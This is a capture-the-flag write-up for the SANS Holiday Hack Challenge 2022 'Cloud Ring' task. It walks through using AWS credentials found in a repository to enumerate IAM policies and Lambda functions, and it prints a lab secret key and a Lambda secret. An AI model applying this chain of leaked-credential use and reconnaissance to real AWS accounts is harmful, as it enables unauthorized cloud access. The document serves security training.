# SANS Holiday Hack Challenge 2022 - KringleCon V: Golden Rings
## Recover the Cloud Ring
### Exploitation via AWS CLI
**Difficulty**: ðŸŽ„ðŸŽ„ðŸŽ„

This challenge walks through identifying and escalating IAM privileges in AWS using the AWS CLI. The goal is to enumerate roles and discover misconfigurations that allow privilege escalation through AWS Lambda.

---

###  Hints

#### Inline Policies
Inline policies are directly attached to a single identity (like a user or role). Unlike managed policies, they cannot be reused across multiple users.

#### Privilege Escalation Vectors
Advanced privilege escalation may involve AWS Lambda or S3. A great walkthrough can be found in Chris Elgeeâ€™s talk on IAM abuse in AWS.

---

###  Solution Walkthrough

#### 1. Configure AWS CLI with Exposed Credentials

We start by cloning the repo and identifying exposed AWS credentials using Trufflehog. Then configure the CLI:
```bash
aws configure
# Access Key: X
# Secret Key: e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL
# Region: us-east-1
```

Verify credentials:
```bash
aws sts get-caller-identity
```

#### 2. Enumerate Attached IAM Policies
```bash
aws iam list-attached-user-policies --user-name haug
```

We discover the user has a policy named `TIER1_READONLY_POLICY`.

#### 3. View Policy Document
```bash
aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
```

Then fetch the actual permissions:
```bash
aws iam get-policy-version   --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY   --version-id v1
```

#### 4. Investigate Lambda Functions
The policy grants Lambda read access:
```bash
aws lambda list-functions
```

This reveals `smogmachine_lambda`. Let's view the environment variables and code path:
```bash
aws lambda get-function-configuration --function-name smogmachine_lambda
```

#### 5. Check Lambda Public Access
Check if thereâ€™s a public URL tied to the Lambda:
```bash
aws lambda get-function-url-config --function-name smogmachine_lambda
```

Success! The function has a public endpoint using AWS_IAM auth and leaks a secret:
```
https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/
```

Environment variables:
- `LAMBDASECRET`: 975ceab170d61c75
- `LOCALMNTPOINT`: /mnt/smogmachine_files

---

###  Summary

By chaining together IAM policy enumeration, Lambda environment analysis, and public function exposure, we uncovered credentials and secrets within AWSâ€”demonstrating a practical AWS privilege escalation scenario.




